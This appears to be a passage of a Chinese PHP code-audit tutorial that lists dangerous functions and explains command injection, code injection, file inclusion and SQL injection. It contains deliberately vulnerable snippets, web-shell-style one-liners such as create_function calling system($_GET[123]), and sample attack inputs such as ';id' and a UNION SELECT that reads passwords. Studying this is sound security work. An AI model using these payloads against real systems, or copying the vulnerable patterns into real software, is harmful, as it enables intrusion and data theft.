create_function &#26681;&#25454;&#20256;&#36882;&#30340;&#21442;&#25968;&#21019;&#24314;&#21311;&#21517;&#20989; &#25968;&#65292;&#24182;&#20026;&#20854;&#36820;&#22238;&#21807;&#19968;&#21517;&#31216; &#21033;&#29992;&#38656;&#35201;&#31532;&#20108;&#20010;&#21442;&#25968;&#21487;&#25511; &#19988;&#21019;&#24314;&#30340;&#20989;&#25968;&#34987;&#25191;&#34892;
$<span style="color: #a0522d;">f</span> = create_function(<span style="color: #8b2252;">''</span>,<span style="color: #8b2252;">'system($_GET[123]);'</span>);
$<span style="color: #a0522d;">f</span>();

include &#21253;&#21547;&#24182;&#36816;&#34892;&#25351;&#23450;&#25991;&#20214; &#25191;&#34892;&#20986;&#38169;&#20250;&#25243;&#20986;&#38169;&#35823;
include <span style="color: #8b2252;">'vars.php'</span>; (&#25324;&#21495;&#21487;&#26377;&#21487;&#26080;)

require &#21516;include &#25191;&#34892;&#20986;&#38169;&#20250;&#25243;&#20986;&#35686;&#21578;
<span style="color: #0000ff;">require</span>(<span style="color: #8b2252;">'somefile.php'</span>); (&#25324;&#21495;&#21487;&#26377;&#21487;&#26080;)

require_once &#21516;require &#20294;&#20250;&#26816;&#26597;&#20043;&#21069;&#26159;&#21542;&#24050;&#32463;&#21253;&#21547;&#35813;&#25991;&#20214; &#30830;&#20445;&#19981;&#37325;&#22797;&#21253;&#21547;

include_once &#21516;include &#20294;&#20250;&#26816;&#26597;&#20043;&#21069;&#26159;&#21542;&#24050;&#32463;&#21253;&#21547;&#35813;&#25991;&#20214; &#30830;&#20445;&#19981;&#37325;&#22797;&#21253;&#21547;
</pre>
</div>

<div class="org-src-container">
<pre class="src src-sh">&lt;?php
<span style="color: #483d8b;">eval</span>(<span style="color: #8b2252;">'phpinfo();'</span>);
<span style="color: #0000ff;">assert</span>(<span style="color: #8b2252;">'phpinfo();'</span>);
<span style="color: #483d8b;">echo</span> preg_replace(<span style="color: #8b2252;">"/e"</span>,<span style="color: #8b2252;">"{${PHPINFO()}}"</span>,<span style="color: #8b2252;">"123"</span>);
<span style="color: #0000ff;">call_user_func</span>(<span style="color: #8b2252;">'assert'</span>, <span style="color: #8b2252;">'phpinfo();'</span>);
<span style="color: #0000ff;">call_user_func_array</span>(<span style="color: #8b2252;">'file_put_contents'</span>, [<span style="color: #8b2252;">'1.txt'</span>,<span style="color: #8b2252;">'6666'</span>]);
$<span style="color: #a0522d;">f</span> = create_function(<span style="color: #8b2252;">''</span>,<span style="color: #8b2252;">'system($_ GET[123]);'</span>); $<span style="color: #a0522d;">f</span>();
include <span style="color: #8b2252;">'vars.php'</span>;
<span style="color: #0000ff;">require</span>(<span style="color: #8b2252;">'somefile.php'</span>);
</pre>
</div>
</div>
</div>
</div>
<div id="outline-container-h:598bb5ce-c04f-4e24-b2ae-eb2f2adebdfe" class="outline-3">
<h3 id="h:598bb5ce-c04f-4e24-b2ae-eb2f2adebdfe">文件读取/SSRF函数</h3>
<div class="outline-text-3" id="text-h:598bb5ce-c04f-4e24-b2ae-eb2f2adebdfe">
<div class="org-src-container">
<pre class="src src-sh">&#20989;&#25968; &#25551;&#36848; &#20363;&#23376;
file_get_contents &#35835;&#20837;&#25991;&#20214;&#36820;&#22238;&#23383;&#31526;&#20018;&#12290;&#21361;&#23475;&#65306;&#20869;&#32593;&#25506;&#27979;
<span style="color: #483d8b;">echo</span> file_get_contents(<span style="color: #8b2252;">"flag.txt"</span>); 
<span style="color: #483d8b;">echo</span> file_get_contents(<span style="color: #8b2252;">"https://ww w.bilibili.com/"</span>);

curl_setopt 
curl_exec
Curl&#35775;&#38382;url&#33719;&#21462;&#20449;&#24687;
<span style="color: #a020f0;">function</span> <span style="color: #0000ff;">curl</span>($<span style="color: #a0522d;">url</span>){
$<span style="color: #a0522d;">ch</span> = curl_init(); 
<span style="color: #0000ff;">curl_setopt</span>($<span style="color: #a0522d;">ch</span>, CURLOPT_URL, $<span style="color: #a0522d;">url</span>);
<span style="color: #0000ff;">curl_exec</span>($<span style="color: #a0522d;">ch</span>); 
<span style="color: #0000ff;">curl_close</span>($<span style="color: #a0522d;">ch</span>); 
} 
$<span style="color: #a0522d;">url</span> =$<span style="color: #a0522d;">_GET</span>[<span style="color: #8b2252;">'url'</span>];
<span style="color: #0000ff;">curl</span>($<span style="color: #a0522d;">url</span>);
https://www.php.net/manual/zh/function.curl-exec.php

fsockopen &#25171;&#24320;&#19968;&#20010;&#22871;&#25509;&#23383;&#36830;&#25509;(&#36828;&#31243;tcp/udp raw)
https://www.php.net/manual/zh/function.fsockopen.php

readfile &#35835;&#21462;&#19968;&#20010;&#25991;&#20214;&#65292;&#24182;&#20889;&#20837;&#21040;&#36755;&#20986;&#32531;&#20914;
&#21516;file_get_contents

fopen/fread/fgets/fgetss/fgetc/fgetcsv/fpassthru/fscanf &#25171;&#24320;&#25991;&#20214;&#25110;&#32773; URL &#35835;&#21462;&#25991;&#20214;&#27969;
$<span style="color: #a0522d;">file</span> = fopen(<span style="color: #8b2252;">"test.txt"</span>,<span style="color: #8b2252;">"r"</span>); 
<span style="color: #483d8b;">echo</span> fread($<span style="color: #a0522d;">file</span>,<span style="color: #8b2252;">"1234"</span>); 
<span style="color: #0000ff;">fclose</span>($<span style="color: #a0522d;">file</span>);

file &#25226;&#25972;&#20010;&#25991;&#20214;&#35835;&#20837;&#19968;&#20010;&#25968;&#32452;&#20013;
<span style="color: #483d8b;">echo</span> implode(<span style="color: #8b2252;">''</span>, file(<span style="color: #8b2252;">'https://www.bilibili.com/ '</span>));

highlight_file/show_source &#35821;&#27861;&#39640;&#20142;&#19968;&#20010;&#25991;&#20214;
<span style="color: #0000ff;">highlight_file</span>(<span style="color: #8b2252;">"1.php"</span>);

parse_ini_file &#35835;&#21462;&#24182;&#35299;&#26512;&#19968;&#20010;ini&#37197;&#32622;&#25991;&#20214;
<span style="color: #0000ff;">print_r</span>(parse_ini_file(<span style="color: #8b2252;">'1.ini'</span>));

simplexml_load_file &#35835;&#21462;&#25991;&#20214;&#20316;&#20026;XML&#25991;&#26723;&#35299;&#26512;
</pre>
</div>

<p>
范例：
</p>
<div class="org-src-container">
<pre class="src src-sh">&lt;?php
<span style="color: #483d8b;">echo</span> file_get_contents(<span style="color: #8b2252;">"flag.txt"</span>);
<span style="color: #483d8b;">echo</span> file_get_contents(<span style="color: #8b2252;">"https://www.bilibili.com/"</span>);

$<span style="color: #a0522d;">file</span> = fopen(<span style="color: #8b2252;">"test.txt"</span>,<span style="color: #8b2252;">"r"</span>);
<span style="color: #483d8b;">echo</span> fread($<span style="color: #a0522d;">file</span>,<span style="color: #8b2252;">"1234"</span>);
<span style="color: #0000ff;">fclose</span>($<span style="color: #a0522d;">file</span>);

<span style="color: #483d8b;">echo</span> implode(<span style="color: #8b2252;">''</span>, file(<span style="color: #8b2252;">'https://www.bilibili.com/ '</span>));

<span style="color: #0000ff;">highlight_file</span>(<span style="color: #8b2252;">"1.php"</span>);

<span style="color: #0000ff;">print_r</span>(parse_ini_file(<span style="color: #8b2252;">'1.ini'</span>));
</pre>
</div>

<div class="org-src-container">
<pre class="src src-sh">$<span style="color: #a0522d;">fp</span> = fsockopen(<span style="color: #8b2252;">"www.example.com"</span>, 80, $<span style="color: #a0522d;">errno</span>, $<span style="color: #a0522d;">errstr</span>, 30);
<span style="color: #a020f0;">if</span> (!$<span style="color: #a0522d;">fp</span>) {
<span style="color: #483d8b;">echo</span> <span style="color: #8b2252;">"$errstr ($errno)&lt;br /&gt;\n"</span>;
} <span style="color: #a020f0;">else</span> {
$<span style="color: #a0522d;">out</span> = <span style="color: #8b2252;">"GET / HTTP/1.1\r\n"</span>;
$<span style="color: #a0522d;">out</span> .= <span style="color: #8b2252;">"Host: www.example.com\r\n"</span>;
$<span style="color: #a0522d;">out</span> .= <span style="color: #8b2252;">"Connection: Close\r\n\r\n"</span>;
<span style="color: #0000ff;">fwrite</span>($<span style="color: #a0522d;">fp</span>, $<span style="color: #a0522d;">out</span>);
<span style="color: #a020f0;">while</span> (!feof($<span style="color: #a0522d;">fp</span>)) {
<span style="color: #483d8b;">echo</span> fgets($<span style="color: #a0522d;">fp</span>, 128);
 }
<span style="color: #0000ff;">fclose</span>($<span style="color: #a0522d;">fp</span>);
}
</pre>
</div>
</div>
</div>
<div id="outline-container-h:f357707e-19c4-4e48-b7fb-465e54b6cf05" class="outline-3">
<h3 id="h:f357707e-19c4-4e48-b7fb-465e54b6cf05">文件上传/写入/其他函数</h3>
<div class="outline-text-3" id="text-h:f357707e-19c4-4e48-b7fb-465e54b6cf05">
<div class="org-src-container">
<pre class="src src-sh">&#20989;&#25968; &#25551;&#36848; &#20363;&#23376;
file_put_contents &#23558;&#19968;&#20010;&#23383;&#31526;&#20018;&#20889;&#20837;&#25991;&#20214;
<span style="color: #0000ff;">file_put_contents</span>(<span style="color: #8b2252;">"test.txt"</span>,<span style="color: #8b2252;">"xxx"</span>);

move_uploaded_file &#23558;&#19978;&#20256;&#30340;&#20020;&#26102;&#25991;&#20214;&#31227;&#21160;&#21040;&#26032;&#30340;&#20301;&#32622;
<span style="color: #0000ff;">move_uploaded_file</span>($<span style="color: #a0522d;">_FILES</span>[ <span style="color: #8b2252;">"pictures"</span>][<span style="color: #8b2252;">"tmp_name"</span>],<span style="color: #8b2252;">"xxx.php"</span>)

rename &#37325;&#21629;&#21517;&#25991;&#20214;/&#30446;&#24405;
<span style="color: #0000ff;">rename</span>($<span style="color: #a0522d;">oldname</span>,$<span style="color: #a0522d;">newname</span>);

rmdir &#21024;&#38500;&#30446;&#24405;

mkdir &#21019;&#24314;&#30446;&#24405;

unlink &#21024;&#38500;&#25991;&#20214;

copy &#22797;&#21046;&#25991;&#20214;
<span style="color: #0000ff;">copy</span>($<span style="color: #a0522d;">file</span>, $<span style="color: #a0522d;">newfile</span>);

fopen/fputs/fwrite &#25171;&#24320;&#25991;&#20214;&#25110;&#32773; URL
https://www.php.net/manual/zh/function.fwrite.php

link &#21019;&#24314;&#25991;&#20214;&#30828;&#38142;&#25509;
<span style="color: #0000ff;">link</span>($<span style="color: #a0522d;">target</span>, $<span style="color: #a0522d;">link</span>);

symlink &#21019;&#24314;&#31526;&#21495;&#38142;&#25509;(&#36719;&#38142;&#25509;)
<span style="color: #0000ff;">symlink</span>($<span style="color: #a0522d;">target</span>, $<span style="color: #a0522d;">link</span>);

tmpfile &#21019;&#24314;&#19968;&#20010;&#20020;&#26102;&#25991;&#20214; (&#22312;&#20020;&#26102;&#30446;&#24405;&#23384;&#25918; &#38543;&#26426;&#25991;&#20214;&#21517; &#36820;&#22238;&#21477;&#26564;)
$<span style="color: #a0522d;">temp</span> = tmpfile(); 
<span style="color: #0000ff;">fwrite</span>($<span style="color: #a0522d;">temp</span>, <span style="color: #8b2252;">"123456"</span>);
<span style="color: #0000ff;">fclose</span>($<span style="color: #a0522d;">temp</span>);

<span style="color: #0000ff;">request</span>()-&gt;file()-&gt;move()
<span style="color: #0000ff;">request</span>()-&gt;file()-&gt;file()
Thinkphp &#25991;&#20214;&#19978;&#20256;: https://www.kancloud.cn/manual/thinkphp5/155159
$<span style="color: #a0522d;">file</span> = request()-&gt;file($<span style="color: #a0522d;">name</span>);
$<span style="color: #a0522d;">file</span>-&gt;move($<span style="color: #a0522d;">filepath</span>);

extractTo &#35299;&#21387;ZIP&#21040;&#30446;&#24405;

DOMDocument loadXML simplexml_import_dom
&#21152;&#36733;&#35299;&#26512; XML &#26377;&#21487;&#33021;&#23384;&#22312; XXE &#28431;&#27934;&#65292;file_get_contents &#33719;&#21462;&#23458;&#25143;&#31471;&#36755;&#20837;&#20869;&#23481; new DOMDocument()&#21021;&#22987;&#21270;XML&#35299;&#26512;&#22120; loadXML($<span style="color: #a0522d;">xmlfile</span>)&#21152;&#36733;&#23458;&#25143;&#31471;&#36755;&#20837;&#30340;XML&#20869;&#23481;simplexml_import_dom($<span style="color: #a0522d;">dom</span>)&#33719;&#21462;XML&#25991;&#26723;&#33410;&#28857;
&#22914;&#26524;&#25104;&#21151;&#21017;&#36820;&#22238;SimpleXMLElement&#23545;&#35937;&#65292;&#22914;&#26524;&#22833;&#36133;&#21017;&#36820;&#22238;FALSE&#12290;
&lt;?php $<span style="color: #a0522d;">xmlfile</span> = file_get_contents(<span style="color: #8b2252;">'php://input'</span>);
$<span style="color: #a0522d;">dom</span> = new DOMDocument();
$<span style="color: #a0522d;">dom</span>-&gt;loadXML($<span style="color: #a0522d;">xmlfile</span>);
$<span style="color: #a0522d;">xml</span> = simplexml_import_dom($<span style="color: #a0522d;">dom</span>);
$<span style="color: #a0522d;">xxe</span> = $<span style="color: #a0522d;">xml</span>-&gt;xxe;
$<span style="color: #a0522d;">str</span> = <span style="color: #8b2252;">"$xxe \n"</span>;
<span style="color: #483d8b;">echo</span> $<span style="color: #a0522d;">str</span>;

simplexml_load_string &#21152;&#36733;&#35299;&#26512;XML&#23383;&#31526;&#20018;&#65292;&#26377;&#21487;&#33021;&#23384;&#22312;XXE&#28431;&#27934;
$<span style="color: #a0522d;">xml</span>=simplexml_load_string($<span style="color: #a0522d;">_REQUEST</span>[<span style="color: #8b2252;">'xml'</span>]);
<span style="color: #0000ff;">print_r</span>($<span style="color: #a0522d;">xml</span>);

simplexml_load_file &#35835;&#21462;&#25991;&#20214;&#20316;&#20026;XML&#25991;&#26723;&#35299;&#26512; &#26377;&#21487;&#33021;&#23384;&#22312;XXE &#28431;&#27934;

unserialize &#21453;&#24207;&#21015;&#21270;
</pre>
</div>

<p>
PHP原生过滤方法
</p>
</div>
<div id="outline-container-h:0c052aba-c4df-4822-a26b-c3eca1a39f92" class="outline-4">
<h4 id="h:0c052aba-c4df-4822-a26b-c3eca1a39f92">过滤函数</h4>
<div class="outline-text-4" id="text-h:0c052aba-c4df-4822-a26b-c3eca1a39f92">
<div class="org-src-container">
<pre class="src src-sh">1. escapeshellarg &#20256;&#20837;&#21442;&#25968;&#28155;&#21152;&#21333;&#24341;&#21495;&#24182;&#36716;&#20041;&#21407;&#26377;&#21333;&#24341;&#21495; &#29992;&#20110;&#38450;&#27490;&#21629;&#20196;&#27880;&#20837;&#12290;
&#20363;&#65306;&#20256;&#20837; <span style="color: #8b2252;">' id # &#22788;&#29702;&#21518; '\'</span> id <span style="color: #b22222;">#</span><span style="color: #b22222;">' &#22788;&#29702;&#21518;&#30340;&#23383;&#31526;&#20018;&#21487;&#23433;&#20840;&#30340;&#28155;&#21152;&#21040;&#21629;&#20196;&#25191;&#34892;&#21442;&#25968;escapeshellcmd &#36716;&#20041;&#23383;&#31526;&#20018;&#20013;&#30340;&#29305;&#27530;&#31526;&#21495; &#29992;&#20110;&#38450;&#27490;&#21629;&#20196;&#27880;&#20837;</span>
&#21453;&#26012;&#32447;&#65288;<span style="color: #8b2252;">\&#65289;</span>&#20250;&#22312;&#20197;&#19979;&#23383;&#31526;&#20043;&#21069;&#25554;&#20837;&#65306; &amp;<span style="color: #b22222;">#</span><span style="color: #b22222;">;`|*?~&lt;&gt;^()[]{}$\, \x0A &#21644; \xFF&#12290; ' &#21644; " &#20165;&#22312;&#19981;&#37197;&#23545;&#20799;&#30340;&#26102;&#20505;&#34987;&#36716;&#20041;</span>

2. addslashes &#22312;&#21333;&#24341;&#21495;&#65288;<span style="color: #8b2252;">'&#65289;&#12289;&#21452;&#24341;&#21495;&#65288;"&#65289;&#12289;&#21453;&#26012;&#32447;&#65288;\&#65289;&#19982; NUL&#21069;&#21152;&#19978;&#21453;&#26012;&#32447; &#21487;&#29992;&#20110;&#38450;&#27490;SQL&#27880;&#20837;</span>

<span style="color: #8b2252;">PDO::quote &#36716;&#20041;&#29305;&#27530;&#23383;&#31526; &#24182;&#28155;&#21152;&#24341;&#21495;</span>
<span style="color: #8b2252;">PDO::prepare &#39044;&#22788;&#29702;SQL&#35821;&#21477; &#26377;&#25928;&#38450;&#27490;SQL&#27880;&#20837; (&#25512;&#33616;)</span>
<span style="color: #8b2252;">htmlspecialchars &#21644; htmlentities &#23558;&#29305;&#27530;&#23383;&#31526;&#36716;&#20041;&#25104;html&#23454;&#20307; &#21487;&#29992;&#20110;&#38450;&#27490;XSS</span>
<span style="color: #8b2252;">intval($input) floatval() floatval() floor() (int)$input num+***\*0\**** &#23558;&#36755;&#20837;&#24378;&#21046;&#36716;&#25442;&#20026;&#25972;&#25968;/&#28014;&#28857; &#24120;&#35265;&#20110;&#38450;&#27490;SQL&#27880;&#20837;</span>
</pre>
</div>
</div>
</div>
</div>
<div id="outline-container-h:4c46b139-01ca-4a67-86fb-d72a6bc3d4f1" class="outline-3">
<h3 id="h:4c46b139-01ca-4a67-86fb-d72a6bc3d4f1">命令注入</h3>
<div class="outline-text-3" id="text-h:4c46b139-01ca-4a67-86fb-d72a6bc3d4f1">
<p>
将用户输入拼接到命令行中执行 导致的任意命令执行问题
例子
</p>
<div class="org-src-container">
<pre class="src src-sh">&lt;?php
$<span style="color: #a0522d;">command</span> = <span style="color: #8b2252;">'ping -c 4 '</span>.$<span style="color: #a0522d;">_GET</span>[<span style="color: #8b2252;">'ip'</span>];
<span style="color: #0000ff;">system</span>($<span style="color: #a0522d;">command</span>); //system&#20989;&#25968;&#29305;&#24615; &#25191;&#34892;&#32467;&#26524;&#20250;&#33258;&#21160;&#25171;&#21360;
</pre>
</div>

<p>
执行ping 命令并输出内容正常输入: /xxx.php?ip=8.8.8.8
</p>

<p>
执行命令 ping -c 4 8.8.8.8，由于ip参数没有任何过滤限制，所以攻击者可以这样输入: /xxx.php?ip=8.8.8.8;id
执行命令 ping -c 1 8.8.8.8;id，这样就可以执行攻击者定义的命令 id
</p>

<p>
通常在实际审计时输入常常不会非常简单都有复杂的处理，需要慢慢追踪参数来源。
</p>

<p>
在审计时遇到输入可控时 要检查是否存在escapeshellarg escapeshellcmd 函数转义 或者是其他的处理方法(如强制类型转换 替换字符 等)
</p>
</div>
<div id="outline-container-h:5986f687-50f9-4625-9081-11253175d8d6" class="outline-4">
<h4 id="h:5986f687-50f9-4625-9081-11253175d8d6">常见bash shell</h4>
<div class="outline-text-4" id="text-h:5986f687-50f9-4625-9081-11253175d8d6">
<div class="org-src-container">
<pre class="src src-sh">&#31526;&#21495; &#25551;&#36848; &#31034;&#20363;
&lt;&#12289;&gt; &#36755;&#20837;&#36755;&#20986;&#37325;&#23450;&#21521; echo abc &gt;1.txt

;&#20998;&#21495; &#25353;&#29031;&#20174;&#24038;&#21040;&#21491;&#39034;&#24207;&#25191;&#34892;&#21629;&#20196; id;whoami;ls

| &#31649;&#36947;&#31526; &#23558;&#24038;&#20391;&#21629;&#20196;&#30340;&#36755;&#20986;&#20316;&#20026;&#21491;&#20391;&#21629;&#20196;&#30340;&#36755;&#20837; ps -aux|grep root

&amp;&amp; &#25353;&#29031;&#20174;&#24038;&#21040;&#21491;&#39034;&#24207;&#25191;&#34892;&#21629;&#20196; &#21482;&#26377;&#25191;&#34892;&#25104;&#21151;&#25165;&#25191;&#34892;&#21518;&#38754;&#30340;&#35821;&#21477;

|| &#25353;&#29031;&#20174;&#24038;&#21040;&#21491;&#39034;&#24207;&#25191;&#34892;&#21629;&#20196; &#21482;&#26377;&#25191;&#34892;&#22833;&#36133;&#25165;&#25191;&#34892;&#21518;&#38754;&#30340;&#35821;&#21477;
</pre>
</div>

<p>
代码注入
</p>

<p>
将用户输入拼接到PHP代码中执行 导致的任意代码执行问题
</p>

<p>
例如使用 eval 等代码执行函数
</p>
<div class="org-src-container">
<pre class="src src-sh">&lt;?php eval(@$<span style="color: #a0522d;">_GET</span>[<span style="color: #8b2252;">'xxx'</span>]);
</pre>
</div>

<p>
输入: xxx=phpinfo(); 执行 phpinfo() 函数，执行系统命令使用 xxx=system(''cmd'');
</p>
<div class="org-src-container">
<pre class="src src-sh">&#20989;&#25968;/&#35821;&#27861;&#32467;&#26500; &#25551;&#36848; &#20363;&#23376;
<span style="color: #483d8b;">eval</span> &#23558;&#20256;&#20837;&#30340;&#21442;&#25968;&#20869;&#23481;&#20316;&#20026;PHP&#20195;&#30721;&#25191;&#34892; eval &#19981;&#26159;&#20989;&#25968;&#65292;&#26159;&#19968;&#31181;&#35821;&#27861;&#32467;&#26500;&#65292;&#19981;&#33021;&#24403;&#20570;&#20989;&#25968;&#21160;&#24577;&#35843;&#29992;
<span style="color: #483d8b;">eval</span>(<span style="color: #8b2252;">'phpinfo();'</span>);

assert &#23558;&#20256;&#20837;&#30340;&#21442;&#25968;&#20869;&#23481;&#20316;&#20026;PHP&#20195;&#30721;&#25191;&#34892; &#29256;&#26412;&#22312;PHP7&#20197;&#19979;&#26159;&#20989;&#25968;&#65292;PHP7&#21450;&#20197;&#19978;&#20026;&#35821;&#27861;&#32467;&#26500;
<span style="color: #0000ff;">assert</span>(<span style="color: #8b2252;">'phpinfo();'</span>);

preg_replace &#24403;preg_replace&#20351;&#29992;/e&#20462;&#39280;&#31526;&#19988;&#21407;&#23383;&#31526;&#20018;&#21487;&#25511;&#26102;&#26102; &#26377;&#21487;&#33021;&#25191;&#34892;php&#20195;&#30721;
<span style="color: #483d8b;">echo</span> preg_replace(<span style="color: #8b2252;">"/e"</span>,<span style="color: #8b2252;">"{${PHPINFO()}}"</span>,<span style="color: #8b2252;">"123"</span>);

call_user_func &#25226;&#31532;&#19968;&#20010;&#21442;&#25968;&#20316;&#20026;&#22238;&#35843;&#20989;&#25968;&#35843;&#29992; &#38656;&#35201;&#20004;&#20010;&#21442;&#25968;&#37117;&#23436;&#20840;&#21487;&#25511;&#25165;&#21487;&#21033;&#29992;&#65292;&#21482;&#33021;&#20256;&#20837;&#19968;&#20010;&#21442;&#25968;&#35843;&#29992;
<span style="color: #0000ff;">call_user_func</span>(<span style="color: #8b2252;">'assert'</span>,<span style="color: #8b2252;">'phpinfo();'</span>);

call_user_func_array &#21516;call_user_func &#21487;&#20256;&#20837;&#19968;&#20010;&#25968;&#32452;&#24102;&#20837;&#22810;&#20010;&#21442;&#25968;&#35843;&#29992;&#20989;&#25968;
<span style="color: #0000ff;">call_user_func_array</span>(<span style="color: #8b2252;">'file_put_contents'</span>,[<span style="color: #8b2252;">'1.txt'</span>,<span style="color: #8b2252;">'6666'</span>]);

create_function &#26681;&#25454;&#20256;&#36882;&#30340;&#21442;&#25968;&#21019;&#24314;&#21311;&#21517;&#20989; &#25968;&#65292;&#24182;&#20026;&#20854;&#36820;&#22238;&#21807;&#19968;&#21517;&#31216; &#21033;&#29992;&#38656;&#35201;&#31532;&#20108;&#20010;&#21442;&#25968;&#21487;&#25511; &#19988;&#21019;&#24314;&#30340;&#20989;&#25968;&#34987;&#25191;&#34892;
$<span style="color: #a0522d;">f</span> = create_function(<span style="color: #8b2252;">''</span>,<span style="color: #8b2252;">'system($_GET[123]);'</span>); $<span style="color: #a0522d;">f</span>();
</pre>
</div>
</div>
</div>
</div>
<div id="outline-container-h:322961ff-c690-46ba-8a8a-374509c5b84b" class="outline-3">
<h3 id="h:322961ff-c690-46ba-8a8a-374509c5b84b">文件包含</h3>
<div class="outline-text-3" id="text-h:322961ff-c690-46ba-8a8a-374509c5b84b">
<p>
将远程/本地文件 包含入当前页面的PHP代码并执行 详细加载执行原理见<a href="https://www.kancloud.cn/nickbai/php7/363301">PHP7内核剖析</a>
</p>

<p>
例子
</p>

<p>
开发人员希望自己写的页面实现更加灵活的加载
</p>

<div class="org-src-container">
<pre class="src src-sh">&lt;?php
$<span style="color: #a0522d;">file</span> = $<span style="color: #a0522d;">_GET</span>[<span style="color: #8b2252;">'page'</span>];
<span style="color: #0000ff;">include</span>(&#8220;pages/$<span style="color: #a0522d;">file</span>&#8221;);
?&gt;
</pre>
</div>

<p>
正常输入 ?page=login.php
</p>
<div class="org-src-container">
<pre class="src src-sh">&lt;?php
$<span style="color: #a0522d;">file</span> = $<span style="color: #a0522d;">_GET</span>[<span style="color: #8b2252;">'page'</span>];
/*
pages/login.php &#25991;&#20214;&#20195;&#30721;&#34987;&#21253;&#21547;&#25191;&#34892;
*/
?&gt;
</pre>
</div>

<p>
服务器包含并执行pages目录下的login.php 攻击者输入 ?page=../image/123.jpg
</p>

<p>
服务器包含并执行pages的上层目录image目录下的123.jpg
</p>

<p>
该漏洞通常需要参数后半部分可控或者参数完全可控才存在
</p>

<p>
文件包含利用方法
包含上传文件 (上传头像图片等)
包含 data:// php://filter 或 php://input 伪协议 (php.ini allow_url_include 设置为 on) 包含日志 Apache nginx 等web服务器访问日志 SSH FTP 等登陆错误日志 PHP框架日志
包含 session文件 (通常在临时目录下 (linux <i>tmp</i> ) sess_会话ID文件) PHP间接或直接创建的其他文件 比如数据库文件 缓存文件 应用日志等
</p>

<div class="org-src-container">
<pre class="src src-sh">&#20989;&#25968;/&#35821;&#27861;&#32467;&#26500; &#25551;&#36848; &#20363;&#23376;
include &#21253;&#21547;&#24182;&#36816;&#34892;&#25351;&#23450;&#25991;&#20214; &#25191;&#34892;&#20986;&#38169;&#20250;&#25243;&#20986;&#38169;&#35823;&#12290;include <span style="color: #8b2252;">'vars.php'</span>; (&#25324;&#21495;&#21487;&#26377;&#21487;&#26080;)
require &#21516;include &#25191;&#34892;&#20986;&#38169;&#20250;&#25243;&#20986;&#35686;&#21578;&#12290;require(<span style="color: #8b2252;">'somefile.php'</span>); (&#25324;&#21495;&#21487;&#26377;&#21487;&#26080;)
require_once &#21516;require &#20294;&#20250;&#26816;&#26597;&#20043;&#21069;&#26159;&#21542;&#24050;&#32463;&#21253;&#21547;&#35813;&#25991;&#20214; &#30830;&#20445;&#19981;&#37325;&#22797;&#21253;&#21547;
include_once &#21516;include &#20294;&#20250;&#26816;&#26597;&#20043;&#21069;&#26159;&#21542;&#24050;&#32463;&#21253;&#21547;&#35813;&#25991;&#20214; &#30830;&#20445;&#19981;&#37325;&#22797;&#21253;&#21547;
</pre>
</div>
</div>
</div>
<div id="outline-container-h:05c483b4-04f4-4baf-9e21-b2db08846904" class="outline-3">
<h3 id="h:05c483b4-04f4-4baf-9e21-b2db08846904">SQL注入</h3>
<div class="outline-text-3" id="text-h:05c483b4-04f4-4baf-9e21-b2db08846904">
<p>
将用户输入拼接到数据库将要执行的SQL语句中 导致攻击者可以修改原有执行的SQL语句
</p>
</div>
<div id="outline-container-h:9bce2f32-1167-4636-8b94-0e9880937b24" class="outline-4">
<h4 id="h:9bce2f32-1167-4636-8b94-0e9880937b24">例子</h4>
<div class="outline-text-4" id="text-h:9bce2f32-1167-4636-8b94-0e9880937b24">
<div class="org-src-container">
<pre class="src src-sh">&lt;?php
<span style="color: #0000ff;">include</span>(<span style="color: #8b2252;">'conn.php'</span>);//&#25968;&#25454;&#24211;&#36830;&#25509;&#30465;&#30053;
$<span style="color: #a0522d;">sql</span> = <span style="color: #8b2252;">"SELECT id, name FROM users WHERE id=$_GET['id']"</span>;
$<span style="color: #a0522d;">result</span> = $<span style="color: #a0522d;">mysqli</span>-&gt;query($<span style="color: #a0522d;">sql</span>);
<span style="color: #a020f0;">if</span> ($<span style="color: #a0522d;">result</span>-&gt;num_rows &gt; 0) {
    <span style="color: #a020f0;">while</span>($<span style="color: #a0522d;">row</span> = $<span style="color: #a0522d;">result</span>-&gt;fetch_assoc()) {
        <span style="color: #483d8b;">echo</span> <span style="color: #8b2252;">"id: "</span> . $<span style="color: #a0522d;">row</span>[<span style="color: #8b2252;">"id"</span>]. <span style="color: #8b2252;">" - Name: "</span> . $<span style="color: #a0522d;">row</span>[<span style="color: #8b2252;">"name"</span>]; 9 }
} <span style="color: #a020f0;">else</span> {
    <span style="color: #483d8b;">echo</span> <span style="color: #8b2252;">"&#27809;&#26377;&#26597;&#35810;&#21040;&#32467;&#26524;"</span>; 12 }
?&gt;
</pre>
</div>

<p>
正常请求 ?id=123 执行SQL
</p>

<div class="org-src-container">
<pre class="src src-sh">1 SELECT id, name FROM users WHERE <span style="color: #a0522d;">id</span>=123;
</pre>
</div>

<p>
攻击者构造请求:
</p>
<div class="org-src-container">
<pre class="src src-sh">?<span style="color: #a0522d;">id</span>=123 UNION SELECT name,password FROM users; &#25191;&#34892;SQL

SELECT id, name FROM users WHERE <span style="color: #a0522d;">id</span>=123 UNION SELECT name,password FROM users;
</pre>
</div>

<p>
攻击者改变了原有的SQL语句逻辑
</p>

<p>
以下为使用PDO连接MySql数据库的实例：
</p>
<div class="org-src-container">
<pre class="src src-sh">&lt;?php
$<span style="color: #a0522d;">type</span> = <span style="color: #8b2252;">'mysql'</span>;
$<span style="color: #a0522d;">hostname</span> = <span style="color: #8b2252;">'127.0.0.1'</span>;
$<span style="color: #a0522d;">dbname</span> = <span style="color: #8b2252;">'xxx'</span>;
$<span style="color: #a0522d;">username</span> = <span style="color: #8b2252;">'root'</span>;
$<span style="color: #a0522d;">password</span> = <span style="color: #8b2252;">'root'</span>;
try {
    $<span style="color: #a0522d;">dsn</span> = sprintf(<span style="color: #8b2252;">'%s:dbname=%s;host=%s;charset=utf8'</span>, $<span style="color: #a0522d;">type</span>, $<span style="color: #a0522d;">dbname</span>, $<span style="color: #a0522d;">hostname</span>);
    //&#21021;&#22987;&#21270;&#19968;&#20010;PDO&#23545;&#35937;
    $<span style="color: #a0522d;">pdo</span> = new PDO($<span style="color: #a0522d;">dsn</span>, $<span style="color: #a0522d;">username</span>, $<span style="color: #a0522d;">password</span>, [
    PDO::ATTR_ERRMODE =&gt; PDO::ERRMODE_EXCEPTION //&#24320;&#21551;&#24322;&#24120;&#27169;&#24335;
     ]);
} catch (PDOException $<span style="color: #a0522d;">e</span>) {
    die (<span style="color: #8b2252;">"Database error: "</span> . $<span style="color: #a0522d;">e</span>-&gt;getMessage());
}
